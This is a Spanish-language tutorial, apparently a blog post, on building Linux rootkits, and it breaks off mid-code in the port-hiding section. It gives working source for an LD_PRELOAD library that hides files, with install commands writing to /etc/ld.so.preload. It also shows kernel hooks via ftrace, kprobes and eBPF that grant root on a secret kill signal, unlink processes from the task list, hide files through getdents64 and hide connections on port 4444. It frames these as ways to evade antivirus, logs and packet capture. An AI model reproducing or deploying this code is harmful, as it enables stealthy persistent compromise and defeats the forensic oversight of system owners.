# 1. Modelo de anillos de privilegios en el kernel

Primeramente para entender los rootkits en Linux de una manera profunda, primero debemos de entender el módelo sobre el que opera el sistema operativo: los **anillos de privilegios** o privileges rings. Definidos por la arquitectura x86/x86-64 o AMD64. 

La CPU implementa cuatro anillos como "protección". En función de menor sea el anillo mayores serán los privilegios para acceder directamenta a kernel, es decir ring 0 será la "capa" más privilegiada. `Linux` realmente utiliza solo **2 Rings**:

```sh
Ring 0 --> Kernel space
Ring 3 --> User space
```

<p align="center">
  <img src="/assets/images/ring.png" alt="Rootkit" width="500">
</p>

El sentido de esto es para que un proceso de usuario no pueda acceder de una a la memoria del kernel, ni jugar a bajo nivel interáctuando con el hardware, ni estabilidad de nuestro sistema.

La única forma que hay controlada de pasar de `Ring 3 a Ring 0` es a través de **syscalls**, las syscalls o llamadas al sistema son un mecanismo por el cual se acaban pidiendo servicios al **kernel**.

## 1.1 Definición

Un `rootkit` con lo visto, es un sigiloso implante que tiene como objetivo manipular el comportamiento esperado de el sistema, para ocultarnos, persistir y otorgar privilegios. Dependiendo el nivel de anillo habrá distintas capacidades, y más o menos dificultad para ser vistos.

Para lograr esto intercepta y modifica `funciones/variables` críticas del sistema, como las syscalls, los registros de eventos, los listados de procesos y archivo, o las conexiones de red. De esta forma la víctima "ve" un comportamiento `normal` alterado que nos `oculta`. 

Es difícil detectarlos por que operan a `bajo nivel` y podemos emplear técnicas que veremos después como: `hooking, la ofuscación de código, el secuestro de arranque` o la manipulación de firmas digitales para evadir `antivirus` y herramientas de `análisis forense`.


## 1.2 Ring 3 - Rootkits en "User Space"

Los tipos de rootkits que operan en la capa de anillo 3, actúan totalmente en el espacio de usuario. La técnica más clásica conocida es abusar de la variable `LD_PRELOAD`. Cuando ejecutamos un binario que está enlazado de forma dinámica, el linker en tiempo de ejecución, es decir `ld.so` carga todas las librerías compartidas que necesite. 

La variable `LD_PRELOAD` permite inyectar una librería `.so` **antes que las demás**, incluso de **libc**. Esto nos posibilita hookear funciones como `readdir, fopen o getpwnet` que son las que utilizan los comandos más utilizados como `ls` o `ps` para ver información de el sistema. Para ganar esta persistencia la librería maliciosa se sobreescribe en la ruta `/etc/ld.so.preload`, y ya directamente afectaría a todos en general.

Sus limitaciones son prácticamente nulas, por que el archivo `/etc/ld.so.preload` es visible desde el kernel.

**NOTA:** Cualquier tool que realize syscalls saltándose `libc` no le afecta.

Desde el kernel, el comportamiento que usa por ejemplo `ls` no cambia. Los procesos que ocultamos siguen existiendo por que el `rootkit` nunca los toca. Una comparación para entenderlo sería:

```sh
Ring 3 --> Como un juego de ilusiones ópticas para el usuario
Ring 0 --> Control Estructural real de el kernel
```

## 1.2.1 Ejemplo para Ocultar un directorio

El objetivo de este ejemplo para un `rootkit` en **Ring 3** es ocultar un directorio de funciones como `ls`.

Algunas **ventajas** de Ring3 contra **Ring0**:

- `Desarollo más sencillo`: Escribir en "user space" es mucho más sencillo que hacerlo en el núcleo. Un error en Ring 0 puede cargarse todo el SO. en `Ring 3` como mucho se cae el proceso infectado.

- `Portabilidad`: Es un rootkit que funciona en cualquier `distro` sin necesidad de compilar contra versiones específicas de kernel. 

- `No requiere Privilegios`: Para cargarlo en un proceso no necesitas ni ser `root`. Basta con establecer una variable de entorno. 

**Paso 1**: Hookear Funciones

El corazón de estos rootkits reside en `hookear funciones`. Lo que vamos a hacer es interceptar las llamadas a funciones clave de la biblioteca de C `libc`.

Para ello conservamos un `puntero` a la función:

```sh
static struct dirent *(*original_readdir)(DIR *dirp) = NULL;
static int (*original_readdir_r)(DIR *dirp, struct dirent *entry, struct dirent **result) = NULL;
```

Estos punteros me permiten llamar a la función para tener la lista de archivos y decidir cuales `filtrar`.

**Paso 2**: Ocultar "wvverez" al listar directorios.

En Linux, funciones como `readdir()` se encargan de devolver una a una la entrada de un directorio. 

La `estrategia` es la siguiente:

- Obtenemos la función `readdir()`.

- Solicitamos archivos al sistema.

- Cada vez que da "wvverez", lo `saltamos` y pedimos el siguiente.

- Cualquier otro archivo --> Funcionamiento normal.

**Paso 3**: Hacer que parezca "inexistente" con `stat()`.

Esto no es suficiente, ya que usando su ruta absoluta podrías acceder. O podría ver si existe mediante `stat()`, que devuelve información como el tamaño, los permisos o las fechas.

Por esto también vamos a hookear `stat()` y su variante `lstat()` que ni sigue symlinks (énlaces simbólicos).

```sh
int stat(const char *path, struct stat *buf) {
    int (*original_stat)(const char *, struct stat *) = dlsym(RTLD_NEXT, "stat");
    if (strstr(path, "wvverez") != NULL) {
        errno = ENOENT;
        return -1;
    }
    return original_stat(path, buf);
}
```

Lo que hago aquí es sencillo, si la ruta contiene "wvverez", hago como que no existe. Es decir le doy la variable `errno` a `ENOENT` (Error NO Entry) y devuelvo `-1` como si hubiera un fallo. 

**NOTA:** Es importante tener en cuenta varias funciones como `lstat()` ya que por symlinks se vería y no queremos eso.

**Paso 4**: Bloquear lo directo con open()

Esto está muy bien, pero que pasa si alguien lo intenta listar con `cat`, `vim`, `nano` o cualquier otro editor de texto. Incluso aunque no lo liste ls y `stat()` dea que no existe. Pues que la víctima podría abrirlo con cualquier editor.

Para hacer esto tenemos que **hookear** la función `open()` que es una función que se encarga de abrir archivos.

```sh
int open(const char *pathname, int flags, ...) {
    int (*original_open)(const char *, int, ...) = dlsym(RTLD_NEXT, "open");
    if (strstr(pathname, "wvverez") != NULL) {
        errno = ENOENT;
        return -1;
    }
    return original_open(pathname, flags);
}
```

Haciendo esto, cuando lo intente abrir también le dirá que no existe. Esto será suficiente por ahora, el código completo es el siguiente:

```sh
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <errno.h>
#include <fcntl.h>

static int (*original_readdir_r)(DIR *dirp, struct dirent *entry, struct dirent **result) = NULL;
static struct dirent *(*original_readdir)(DIR *dirp) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, "wvverez") == 0) {
            continue;
        }
        break;
    }
    return entry;
}

int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
    if (!original_readdir_r) {
        original_readdir_r = dlsym(RTLD_NEXT, "readdir_r");
    }

    int ret;
    while ((ret = original_readdir_r(dirp, entry, result)) == 0 && *result != NULL) {
        if (strcmp((*result)->d_name, "wvverez") == 0) {
            continue;
        }
        break;
    }
    return ret;
}

int stat(const char *path, struct stat *buf) {
    int (*original_stat)(const char *, struct stat *) = dlsym(RTLD_NEXT, "stat");
    if (strstr(path, "wvverez") != NULL) {
        errno = ENOENT;
        return -1;
    }
    return original_stat(path, buf);
}

int lstat(const char *path, struct stat *buf) {
    int (*original_lstat)(const char *, struct stat *) = dlsym(RTLD_NEXT, "lstat");
    if (strstr(path, "wvverez") != NULL) {
        errno = ENOENT;
        return -1;
    }
    return original_lstat(path, buf);
}

int open(const char *pathname, int flags, ...) {
    int (*original_open)(const char *, int, ...) = dlsym(RTLD_NEXT, "open");
    if (strstr(pathname, "wvverez") != NULL) {
        // Para cualquier intento que haga de abrir algo con "wvverez"
        errno = ENOENT;
        return -1;
    }
    return original_open(pathname, flags);
}
```

Ahora vamos a probarlo, para ello vamos a empezar compilando para generar una biblioteca `compartida y dinámica`.

```sh
┌──(wvverez㉿rootkit)-[~/blog]
└─$ gcc -shared -fPIC -o malware.so rootkit.c
```

Y ahora vamos a forzarlo a cargar esa `biblioteca` antes que cualquier otra `función`. 

```sh
┌──(wvverez㉿rootkit)-[~/blog]
└─$ echo '/home/wvverez/blog/malware.so' | sudo tee /etc/ld.so.preload
```

Ahora podemos comprobarlo.

```sh
┌──(wvverez㉿rootkit)-[~/blog]
└─$ ldd /bin/ls | grep malware.so
        /home/wvverez/blog/malware.so (0x0000789b4619b000)
```

Está todo listo. Ahora vamos a hacer la prueba de crear el directorio:

```sh
┌──(wvverez㉿rootkit)-[~/blog]
└─$ ls

┌──(wvverez㉿rootkit)-[~/blog]
└─$ mkdir test

┌──(wvverez㉿rootkit)-[~/blog]
└─$ ls
malware.so  prueba  pwndbg  rootkit.c  test

┌──(wvverez㉿rootkit)-[~/blog]
└─$ mkdir wvverez

┌──(wvverez㉿rootkit)-[~/blog]
└─$ ls
```

Como podemos ver, conseguimos que no lo liste.

## 1.3 Ring 0 - Rootkits en "Kernel Space"

Un `rootkit` de Ring 0 vive en el `Kernel Space`. En Linux se hace a través de un `LKM` (Loadable Kernel Module), que es código que se carga en el kernel en tiempo de ejecución. Sin necesidad de volver a compilar ni reiniciar. 

Si ese código es `malicioso` el **kernel** no puede saberlo. Una vez se carga actúa con los `mismo privilegios` que el kernel (absolutos).

La principal diferencia entre Ring 0 y Ring 3 es que aquí no hay ningún mecanismo de seguridad entre nuestro `rootkit` y el `hardware`. El `rootkit` puede acceder a toda la `memoria física`, las estructuras internas como (`task_struct`,`file` o `socket`), las tablas de `syscalls`, mecanismos de `tracing`.

**NOTA**: Podríamos deshabilitar `SELinux` editando su memoria. No hace falta aplicar ningún **bypass** ya que actúan en el `mismo nivel`.

Esto es una gran diferencia a comparación de **Ring 3** ya no nos estamos comparando con el `kernel`, es que nos convertimos en parte del kernel.

# 2. Funcionamiento de un LKM (Loadable Kernel Module)

Un `Loadable Kernel Module` es código C compilado (siguiendo unos requisitos del kernel). Cualquier módulo tiene **2 funciones** principales, una de inicialización con `module_init()`, que se ejecuta al cargarlo con `insmod`, y otra que es `module_exit()`, que se ejecuta al descargarlo con `rmod`. Al compilar esto conseguimos un archivo con extensión `.ko` que viene de `Kernel Object`.

El módulo usa macros como: `licencia, autor, desc...`. La licencia puede ser interesante desde un punto de vista atacante. Declarar `MODULE_LICENSE("GPL")` es necesario para acceder a algunas funcionalidades de el **kernel**. 

Sin esto algunas funciones que se utilizan para el `hooking actual` no estarán disponibles. Y el kernel puede llegar a registrar su estado como `contaminado`. Es un `trade-off` que la mayoría de los rootkits modernos aceptan.

Algunas funciones como `printk()` es igual en kernel space de `printf()`. Los mensajes van al `ring buffer` del kernel. Que se puede acceder don `dmesg`. Un rootkit hecho por novatos puede ser visto en este buffer. Por esto los mejores `rootkits` evitan cualquier `printk()`.

**NOTA:** Algo a tener en cuenta también es que la carga de un `LKM` (Loadable Kernel Module) requiere `CAP_SYS_MODULE`, que significa root. La dificultad de un **rootkit LKM** no es escalar privilegios cargandolo, sino en conseguir cargarlo `EL PRIMERO`. 

# 3. Syscalls 

Las `syscalls` son el mecanismo que permite a los procesos en `Ring 3` solicitar servicios al kernel. Cuando un proceso ejecuta algo tan normal como `open()`, `read()` o `write()` desde nuestra `libc`. Esto internamente se traduce en una instrucción `syscall` que eleva el Ring 3 a Ring 0. Y ejecuta la función que corresponda al kernel. Cada `syscall` tiene un número distinto, lo que las hace únicas, aquí comparto una tabla con algunas de las `syscalls` para `x86-64` o AMD64 más comunes y sus funcionamientos.


| Syscall | Funcionamiento |
|---|---|
| `getdents64()` | Obtiene las entradas de un directorio a partir de un descriptor de archivo. |
| `openat()` | Abre un archivo o directorio relativo a un descriptor de directorio. |
| `kill()` | Envía una señal a un proceso o grupo de procesos. |
| `setuid()` | Cambia el identificador de usuario del proceso, sujeto a los permisos disponibles. |
| `init_module()` | Carga un módulo del kernel en sistemas que proporcionan esta interfaz. |
| `finit_module()` | Carga un módulo del kernel desde un descriptor de archivo. |
| `read()` | Lee datos desde un descriptor de archivo hacia un búfer. |
| `write()` | Escribe datos de un búfer en un descriptor de archivo. |
| `execve()` | Ejecuta un programa reemplazando la imagen del proceso actual. |
| `fork()` | Crea un nuevo proceso a partir del proceso actual. |
| `clone()` | Crea un proceso o hilo con opciones configurables sobre los recursos compartidos. |
| `ptrace()` | Permite observar o controlar la ejecución de otro proceso, utilizado principalmente para depuración. |
| `ioctl()` | Realiza operaciones específicas de control sobre dispositivos y otros descriptores. |
| `socket()` | Crea un endpoint para comunicación mediante sockets. |
| `connect()` | Establece una conexión de un socket con una dirección determinada. |
| `bind()` | Asocia un socket con una dirección local. |
| `listen()` | Configura un socket para aceptar conexiones entrantes. |
| `accept()` | Acepta una conexión pendiente en un socket de escucha. |
| `mmap()` | Mapea memoria o archivos en el espacio de direcciones del proceso. |
| `mprotect()` | Cambia los permisos de acceso de una región de memoria. |

**Nota:** `tcp4_seq_show` no es una syscall. Es una función interna del kernel relacionada con la representación de información de conexiones TCP IPv4 mediante `/proc/net/tcp`. Por eso no la meti en la columna de syscalls. Pero nos será de utilidad igual.

Las más utilizadas para rootkits son estas pero para los curiosos si quereis conocer más os comparto esta tabla: [https://filippo.io/linux-syscall-table/](https://filippo.io/linux-syscall-table/)

El objetivo de un `rootkit` en Ring 0 es interceptar estas llamadas antes de que ejecuten su lógica original, cambiar sus argumentos o resultados, y ahí decidimoa si pasamos la ejecución original o retornar a algo falso. Esta técnica de nombre tiene `syscall hooking` o `function hooking`.

# 4. Aprendiendo técnicas de Hooking 

Hace bastante tiempo, los de la vieja escuela usaban una técnica que era la modificación directa de `sys_call_table`, se localizaba en memoria la tabla de punteros a funciones de `syscalls`.

Se deshabilita la protección de escritura de el registro `CR0`, y se sobreescribía el puntero con la dirección de hook. Bueno esto obviamente ya no funciona en Kernels modernos, por muchas protecciones `hardware` o compilación como:

- `SMEP`

- `SMAP`

- `CONFIG_STRICT_KERNEL_RWX`

Estas protecciones hacen que cuando un atacante intenta escribir en memoria cause un `Kernel Panic`. Las que se utilizan actualmente son: `ftrace`, `kprobes` y `eBPF`.

# 4.1 FTRACE

`ftrace` es una infraestructura de `tracing` interna para el kernel de Linux. Fue creada principalmente para las funciones de los desarolladores.

Cuando el kernel se compila con `CONFIG_FTRACE=y` el cual está activo ya predeterminada en casi todas las distros. Se meten instrucciones `NOP` al inicio de cada función de el kernel. Cuando `ftrace` está activo esos `NOPS` se reemplazan en tiempo de ejecución por callbacks y los llama.

Un `rootkit` crea su propia `callback` para la función de el kernel que quiera `hookear`.

La clave es el parámetro: `FTRACE_OPS_FL_IPMODIFY`, una vez lo habilitas el `rootkit` puede modificar el registro `ip --> instruction pointer` dentro de el callback, redirigiendo la ejecución hacia la misma antes de que la original se ejecute. 

Una vez hecho la original queda accesible a través de un puntero que hemos guardado, permitiéndole al `rootkit` llamar a algo fake.

Está es la técnica más popular para `rootkits modernos` públicos por que es muy limpio, no toca ninguna tabla del kernel. Y es compatible con versiones modernas de kernel. Una librería muy util para esto es `ftrace_helper.h` de **xcellerator** [https://xcellerator.github.io/tags/rootkit/](https://xcellerator.github.io/tags/rootkit/) que pilla los `hooks` en unas pocas macros.

El patrón siempre es el mismo es algo así:

```sh
Declaras un puntero a la función --> hookeas con la misma firma que la original --> registras el par en un array de hooks que la librería de este señor gestiona
```

Esto es lo común para hookear funciones en kernels modernos. El código es el siguiente:

```sh
#include "ftrace_helper.h"

// Este es el puntero de la función original
static asmlinkage long (*orig_openat)(const struct pt_regs *regs);

// Aquí nuestra función de reemplazo, misma firma que la original
static asmlinkage long hook_openat(const struct pt_regs *regs)
{
    char nombre[256];

    if (copy_from_user(nombre, (char __user *)regs->si, sizeof(nombre)) == 0) {
        // Si el archivo contiene nuestro prefijo secreto, fingimos que no existe
        if (strncmp(nombre, ".rk_", 4) == 0)
            return -ENOENT;
    }
    // Cualquier otro archivo: dejar pasar a la función real (comportamiento normal)
    return orig_openat(regs);
}

// Aquí Tabla de hooks: nombre del símbolo, función hook, puntero al original
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_openat", hook_openat, &orig_openat),
};

static int __init rk_init(void) {
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

static void __exit rk_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
```

# 4.2 Kprobes 

Considero `kprobes` como uno de los mecánismos más poderosos y sútiles que hay disponibles en el kernel de **Linux** para la instrumentación `dinámica` en tiempo de ejecución.

Para que comprendamos al 100% su importancia es necesario que lo situemos en el contexto más amplio de las herramientas de depuración y monitoreo del kernel. Mientras que `ftrace` ofrece una aproximación que se basa en funciones completas, permitiendo rastrear la entrada y salida de funciones del kernel a través de sus `símbolos`.

`kprobes` lleva esto más alla proporcionando un nivel súper fino. Esto permite modificar el comportamiento de el kernel en entornos de producción o sin necesidad de `recompilar` el kernel o reiniciar el sistema.

El proceso para `kprobe` comienza cuando específicamos una **dirección de memoria** dentro de el espacio de el kernel donde vamos a colocar la `sonda`.

Esta `dirección` puede corresponder a el inicio de una función, a una instrucción o a cualquier ubicación del kernel en realidad. (siempre que sea válida para ejecución).

El paso más delicado de este proceso consiste en modificar el código en tiempo de ejecución. El kernel reemplaza la instrucción original en la dirección que se especifique con un `breakpoint`, que en la arquitectura x86 actúa como el `opcode 0xCC` que corresponde con `INT3`.

Esta instrucción, cuando la ejecuta la CPU, desencadena como una "excepción" que el kernel manda al mecanismo de `kprobes`.

Después se identifica que la "excepción" se ha hecho en una dirección que tiene asociada un `kprobe` y desvía la ejecución. En este punto el kernel debe hacer una serie de comprobaciones para confirmar que la `sonda` se ejecute bien. Sin alterar el sistema, aunque más allá de lo que haya solicitado el atacante.

El primer handler al que llama es el `pre_handler`, que como dice su nombre, se ejecuta antes que la instrucción original. Este `handler` recibe como `parámetros` un puntero a la estructura del kprobe (entre otras estructuras). 

Puede hacer operaciones como modificar el estado de registros antes de que la instrucción original se ejecute. 

**NOTA para curiosos**:

En la mayoría de las arquitecturas, incluyendo `x86`, el single-stepping se logra activando el flag `TF` (Trap Flag) en el registro de flags de la CPU. Cuando este flag está activo, la CPU ejecuta una instrucción y luego genera una excepción de debug, que el kernel captura para procesar el `post_handler`.

con `kretprobe` también podemos tirar de un `rootkit` que deje que `getdents64` ejecute normalmente y reciba toda la lista de archivos de el kernel. y luego en el kretprobe filtrar las entradas que no quiere mostrar antes de devolvérsela al proceso.

A nivel práctico, `ftrace` y `kprobes` se diferencian principalmente en el modo en que realizan la instrumentación. `ftrace` presenta un menor coste de ejecución al emplear trampolines en lugar de `breakpoints`, por lo que suele ser la opción más adecuada cuando se busca hookear una syscall completa. Por otro lado, kprobes permite una intervención más específica, ya que puede situarse en un punto determinado de una función, siendo útil cuando se necesita interceptar únicamente una parte concreta o cuando los privilegios impiden utilizar ftrace.

Aquí tenemos el código de el flujo de prueba:


```sh
// Cada vez que el kernel ejecute un proceso
// el handler lo ejecutamos primero.

static int pre_commit_creds(struct kprobe *kp, struct pt_regs *regs)
{
    struct cred *entrante = (struct cred *)regs->di; // primer argumento
    // Si el proceso que invoca es el nuestro (identificado por PID),
    // forzamos uid=0 antes de que commit_creds lo aplique (UID de root)
    if (current->pid == MAGIC_PID) {
        entrante->uid.val  = 0;
        entrante->euid.val = 0;
    }
    return 0;
}

```

Y aquí tenemos el ejemplo con `kretprobe`:

```sh
static struct kprobe kp_commit = {
    .symbol_name = "commit_creds",
    .pre_handler = pre_commit_creds,
};

// Ejemplo con kretprobe: handler en el retorno de vfs_read
// Deja que vfs_read ejecute y modifica cuántos bytes dice haber leído.

static int ret_vfs_read(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    long bytes_leidos = regs_return_value(regs);
    // Si la lectura es exitosa y la hacía nuestro PID oculto,
    // mentir sobre la cantidad para confundir herramientas que lo listen 
    if (bytes_leidos > 0 && current->pid == MAGIC_PID)
        regs_set_return_value(regs, 0);
    return 0;
}

static struct kretprobe krp_vfs_read = {
    .symbol_name = "vfs_read",
    .handler     = ret_vfs_read,
};

static int __init rk_init(void) {
    register_kprobe(&kp_commit);
    register_kretprobe(&krp_vfs_read);
    return 0;
}

```

# 4.3 Hookeando con eBPF

`eBPF` que viene de (extended Berkeley Packet Filter) es considerada la mejor tecnología que ha llegado al kernel en las últimas decadas para muchos. Su principal carácteristica es que permite `ejecutar código` en Ring 0 sin necesidad de tener que cargar ningún módulo del kernel. Un programa `eBPF` se escribe en C, se compila a bytecode, lo verifica el kernel de que no pueda romper el sistema ni acceder a memoria inválida. Y se `mete` en el kernel directamente donde se compila `JIT` a instrucciones `x86-64`.

`eBPF` incluye también `kprobe` y `kretprobes` que son gestionados por `eBPF`, `tracepoints`, `hooks` fentry/fexit (entrada y salida de funciones) y `XPD/tc` para manipulación de paquetes al nivel más bajo.

`eBPF` realmente es de las mejores formas que existen para kernels modernos por muchas razones como:

- Como no es un `LKM` no aparece en `lsmod` ni en `available_filter_functions`.

- No es sospechoso por que muchas herramientas legítimas también lo usan.

- Los programas pueden ser "pinneados" en la ruta --> `/sys/fs/bpf`.

- Y con `XDP` o `TC` puedes modificar el tráfico a el nivel más bajo.

**NOTA**: Con `XDP` o `tc` puedes modificar el tráfico como si nada, el sistema operativo lo verá normal, y herramientas como `tcpdump` o `wireshark` no van a ver nada.

Hay muchos proyectos que enseñan como opera entre ellos os comparto los siguientes:

- [https://github.com/rphang/evilBPF](https://github.com/rphang/evilBPF)

- [https://github.com/hackerschoice/bpfhacks](https://github.com/hackerschoice/bpfhacks)

```sh

// Compilas con --> clang -O2 -target bpf -c rk_kill.c -o rk_kill.o

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

char LICENSE[] SEC("license") = "GPL";

// Mapeo para compartir datos entre el programa eBPF y el espacio de usuario
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 12);
} eventos SEC(".maps");

// fentry se ejecuta en la entrada de __x64_sys_kill
// Registra cualquier uso de la señal 59, nuestra señal de privesc
SEC("fentry/__x64_sys_kill")
int vigilar_kill(struct pt_regs *regs)
{
    int signal = (int)PT_REGS_PARM2_CORE(regs);
    pid_t pid  = (pid_t)PT_REGS_PARM1_CORE(regs);

    if (signal == 59) {
        // Enviar el evento al ring buffer para que lo lea el daemon en user space
        struct { pid_t pid; int sig; } *evento;
        evento = bpf_ringbuf_reserve(&eventos, sizeof(*evento), 0);
        if (evento) {
            evento->pid = pid;
            evento->sig = signal;
            bpf_ringbuf_submit(evento, 0);
        }
    }
    return 0;
}
```

# 5. Escalada de Privilegios

Cuando tenemos un `rootkit` con hooking activo. La `privesc` es la capacidad más común. El objetivo es que un proceso en `Ring 3` sin privilegio alguno pueda obtener `uid=0` es decir `root`. 

La idea conseguirlo de forma instantánea y sin dejar ningún tipo de rastro en logs de `auth`.

Esto se apoya en 2 funciones internas que tiene el kernel: `prepare_creds()`, que crea una copia de las creds de el proceso actual, y `commit_creds` que aplica las nuevas credenciales al proceso. 

Ambas funciones son `Ring 0`. La estructura `cred` contiene cualquier identificador de usuario o grupo, es decir:

```sh
uid
gid
euid
egid
suid
sgid
fsuid
fsgid

```

Y a mayores las capabilities de el proceso. Un `rootkit` puede crear unas creds con todo lo anterior, y darselas a cualquier proceso que las pida.

El caso más común para activar esto es hookeando `sys_kill`. Esta syscall acepta un PID y un número de señal. Al hookear esto el `rootkit` define una señal como objetivo secreto.

Cuando cualquier proceso envía esa señal, el hook que hacemos escala los privilegios que tenga el proceso.

Desde el punto de vista del sistema, es algo normal que no da ninguna alerta, desde la máquina atacante conseguimos una shell como `root`.

```sh
static asmlinkage long hook_kill(const struct pt_regs *regs) {
    int signal = regs->si; // segundo argumento --> número de señal

    if (signal == 59) { // señal 
        struct cred *nuevas = prepare_creds();
        if (nuevas) {
            nuevas->uid.val   = nuevas->euid.val  = 0;
            nuevas->gid.val   = nuevas->egid.val  = 0;
            nuevas->suid.val  = nuevas->fsuid.val = 0;
            nuevas->sgid.val  = nuevas->fsgid.val = 0;
            // Dar capabilities completas
            nuevas->cap_effective   = CAP_FULL_SET;
            nuevas->cap_permitted   = CAP_FULL_SET;
            nuevas->cap_inheritable = CAP_FULL_SET;
            commit_creds(nuevas);
        }
        return 0;
    }
    return orig_kill(regs); // comportamiento normal para el resto 
}
```

Desde user space o `ring 3`, se activa con 

```sh
kill -590
```

En ese instante el proceso consigue `uid=0` y capabilities.

**NOTA**: No hay PAM, no hay sudo, no hay logs. Nos dio `root` desde dentro


# 5.1 Ocultar Procesos 

Cada proceso que tenemos en `Linux` está representado por `task_struct` que está más de una vez enlazada que mantiene el kernel. El filesystem `/proc` lo expone. Cada número en `/proc` corresponde a un PID de algún proceso activo. 

Tools como `ps`, `top`, `htop` y `kill` dependen de esto para saber que procesos existen.

Hay varias técnicas para ocultar procesos, como hookear `filldir64`. Cada vez que esa función prepara una entrada para `/proc`, el hook comprueba si su nombre corresponde con el PID a ocultar. Lo que hace es no mostrar la entrada en su resultado.

Para cualquier proceso que llame a `opendir("/proc")` hará como si ese PID nunca existiera. 

La segunda opción es desconectar directamente `task_struct` del proceso de la lista de tareas, esto es más directo. El proceso se va a seguir ejecutando por que el `scheduler` lo sabe por otras estructuras internas que no vamos a tocar. Es más difícil de detectar por que no saldría en ninguna lista estándar. 

```sh
// PID que oculta --> en un rootkit real vendría de una señal o un canal de control
#define PID_OCULTO 1337

static asmlinkage long hook_filldir64(struct dir_context *ctx,
                                      const char *nombre, int longitud,
                                      loff_t offset, u64 ino,
                                      unsigned int tipo)
{
    // Convierte el nombre de la entrada a número para compararlo con el PID
    // (las entradas de /proc son directorios con nombre igual al PID)
    char pid_str[16];
    snprintf(pid_str, sizeof(pid_str), "%d", PID_OCULTO);

    if (strncmp(nombre, pid_str, longitud) == 0)
        return 0; // suprime esto: el PID desaparece de /proc

    return orig_filldir64(ctx, nombre, longitud, offset, ino, tipo);
}

// Desconexión del task_struct , técnica más agresiva
static void ocultar_proceso(pid_t pid_objetivo)
{
    struct task_struct *tarea;

    // Itera la lista de tareas del kernel buscando el PID
    for_each_process(tarea) {
        if (tarea->pid == pid_objetivo) {
            // Desconecta de la lista circular de procesos
            list_del_init(&tarea->tasks);
            break;
        }
    }
}
```


# 5.2 Ocultar archivos y directorios

El proceso es parecido al de procesos pero este actúa en el `VFS` o (Virtual File System) general. La syscall `getdents64` es la que usan los comandos `ls`, `find`, `opendir()` esto todo lo vimos al principio cuando tocamos Ring 3. Y sirve para cualquier programa que liste el contenido de un directorio. Aunque es diferente, aquí la estrategia es la siguiente:

```sh
Al hookear recibimos el buffer --> lo copia a memoria del kernel --> Filtra a través de linux_dirent64 --> para lo demás comportamiento normal
```

Manipular `linux_dirent64` no es tan simple, cada entrada dentro del buffer tiene un parámetro `d_reclen` que indica el tamaño de la entrada. Y donde va a empezar la siguiente. Para eliminar una sería sumar su `d_reclen` con el de la entrada anterior. 

De esa forma salta de la anterior a la siguiente de la actual, y se salta la oculta (nuestra como atacante) y sin saber que si hay hueco en el buffer.

Una técnica muy utilizada consiste en elegir un `prefijo` (un string) para ocultar archivos. Cualquier archivo cuyo nombre empiece por ese prefijo será invisible al listar cualquier carpeta del sistema. Por ello, el rootkit oculta fácilmente sus archivos de configuración, los registros de actividad o incluso su propio archivo `.ko` (Kernel Object) si está almacenado en el disco.

```sh
#define PREFIJO_OCULTO ".rk_"

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    // Ejecuta la syscall original y obtiene el buffer real de su kernel
    long total = orig_getdents64(regs);
    if (total <= 0) return total;

    struct linux_dirent64 __user *u_buf = (void *)regs->di;
    struct linux_dirent64 *k_buf = kzalloc(total, GFP_KERNEL);
    if (!k_buf) return total;

    if (copy_from_user(k_buf, u_buf, total)) {
        kfree(k_buf);
        return total;
    }

    struct linux_dirent64 *entrada  = k_buf;
    struct linux_dirent64 *anterior = NULL;
    long procesado = 0;

    while (procesado < total) {
        if (strncmp(entrada->d_name, PREFIJO_OCULTO, strlen(PREFIJO_OCULTO)) == 0) {
            // Se fuma esta entrada: el anterior "salta" directamente a la siguiente
            if (anterior)
                anterior->d_reclen += entrada->d_reclen;
            else {
                // Es la primera entrada del buffer --> desplaza todo hacia adelante
                total -= entrada->d_reclen;
                memmove(entrada, (void *)entrada + entrada->d_reclen,
                        total - procesado);
                continue; // no avanza ahora 'entrada' apunta a la siguiente
            }
        } else {
            anterior = entrada;
        }
        procesado += entrada->d_reclen;
        entrada = (void *)k_buf + procesado;
    }

    copy_to_user(u_buf, k_buf, total);
    kfree(k_buf);
    return total;
}
```

# 5.3 Ocultar conexiones/puertos 

Para ocultar conexiones de red, el objetivo no son las `syscalls` si no sus funciones que leen y exponen esa información (el estado de los sockets) en `/proc/net`. Cuando `netstat`, `ss` o `lsof` solicitan estos datos. 

Simplemente leen archivos que son en `/proc/net/tcp`, `/proc/net/tcp6`, `/proc/net/udp`. Estos archivos se crean en tiempo real por algunas funciones de el kernel que reciben los sockets y los escriben en buffer de salida algunos ejemplos son estos:

```sh
tcp4_seq_show
tcp6_seq_show
udp4_seq_show
udp6_seq_show
```

Hookear estas funciones permite interceptar cada entrada antes de que sea escrita. El hook pilla el `sock` comprueba si su puerto o dirección IP es alguno de los que tiene que ocultar, y en ese caso devuelve `NULL` es decir vacío sin escribir nada. Para todos los demás llamará a la función normal. 

El resultado de esto es que nunca se van a dar cuenta de los `sockets` que marquemos como ocultos. Y va a estar activo y aceptando las demás conexiones por lo que no levanta sospechas.

Si queremos ser profesionales debemos hookear más allá, hookeando también `packet_rcv` y `tpacket_rcv` que son los paquetes que reciben paquetes.

Al filtrar ahí también herramientas como `WireShark` o `tcpdump` tampoco van a poder ver el tráfico 🫣.

Si combinamos ambos hooks hace el rootkit completamente `invisible` tanto a nivel de tools como de tráfico de red. 

Ejemplo: 

```sh
#define PUERTO_OCULTO 4444

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    // v == (void*)0x1 es el marcador de cabecera de la tabla, no un socket real
    if (v != (void *)0x1) {
        struct sock *sk = (struct sock *)v;
        // sk_num es el puerto local en orden de host
        if (sk->sk_num == PUERTO_OCULTO)
